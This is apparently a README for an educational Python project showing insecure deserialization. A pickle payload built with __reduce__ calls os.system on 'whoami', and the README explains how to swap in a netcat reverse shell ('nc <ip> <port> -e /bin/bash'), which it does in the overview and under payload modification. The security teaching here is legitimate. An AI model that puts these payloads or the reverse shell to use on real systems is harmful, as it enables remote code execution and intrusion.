
# **Insecure_Deserialization**

## **Overview**
`Insecure_Deserialization` is a simple Python program designed to demonstrate and explore the concept of insecure deserialization in a hands-on and practical way. The program includes a **serializer** and a **deserializer** to showcase how serialized objects can be manipulated and executed.

This program is primarily for educational purposes, aiming to provide insights into the risks and potential exploitation of insecure deserialization. Additionally, it can be adapted to execute a reverse shell by replacing the default command (`whoami`) with something like `nc <ip> <port> -e /bin/bash`.


## **Features**
- **Serialization (`serializer.py`)**:
  - Encodes an object containing a malicious payload into a serialized format.
  - Outputs the serialized payload in Base64 format.

- **Deserialization (`deserializer.py`)**:
  - Decodes and executes the serialized payload.

- **Custom Commands**:
  - Modify the default `whoami` command in the serializer to execute custom shell commands or even establish a reverse shell.


## **Usage**
### **1. Serialization**
Run the `serializer.py` script to generate a malicious payload:

```
python serializer.py
```

### **2. Deserialization**
Copy the serialized Base64 string and run the `deserializer.py` script. Paste the string as input when prompted:

```
python deserializer.py
```

## **Modifying the Payload**
The default payload executes the `whoami` command. To change the command:

1. Open `serializer.py`.
2. Modify the `return (os.system, ("whoami",))` line in the `Evil` class:
   
   ```
   return (os.system, ("<your_command>",))
   ```
3. For a reverse shell, you can use:
   
   ```
   return (os.system, ("nc <ip> <port> -e /bin/bash",))
   ```

## Example of use via terminal in kali linux (in this case, without venv):

<div align="center">
  <img src="[URL_DA_IMAGEM](https://github.com/user-attachments/assets/fda334c0-a684-496f-8185-c6ea203e89fc)" width="300">
</div>



## **Warnings**
- **Educational Purposes Only**: This program is intended to teach the concept of insecure deserialization and should not be used for malicious purposes.
- **Security Risks**: The deserialization of untrusted data is a critical security risk. Avoid using insecure serialization methods like `pickle` in production applications.
- **Test Environment**: Always use this program in a controlled and isolated environment, such as a virtual machine or sandbox.


## **How It Works**
1. The **`Evil` class** in `serializer.py` uses the `__reduce__` method to define a malicious command.
2. The `pickle.dumps` function serializes the `Evil` object.
3. The serialized payload is Base64-encoded and displayed.
4. In `deserializer.py`, the Base64-encoded payload is decoded and deserialized using `pickle.loads`, triggering the execution of the malicious command.


## **Disclaimer**
This program is for educational and testing purposes only. The author is not responsible for any misuse of this code.


## **Setting Up the Environment**

To ensure compatibility and proper setup, it is recommended to use a virtual environment (**venv**). Follow the steps below to create and activate your own virtual environment:

### **1. Create a Virtual Environment**
Run the following command to create a virtual environment in the project directory:

```
python -m venv venv
```

### **2. Activate the Virtual Environment**
Activate the virtual environment based on your operating system:

- **On Windows**:
  ```
  venv\Scripts\activate
  ```
- **On Linux/MacOS**:
  ```
  source venv/bin/activate
  ```

### **3. Deactivate the Virtual Environment**
When you're done working on the project, deactivate the virtual environment by running:

```bash
deactivate
```

---

### **Note on Virtual Environments**
The virtual environment (**venv**) is not included in this repository to reduce its size and avoid compatibility issues across different operating systems. Instead, you can generate it locally by following the steps above. 
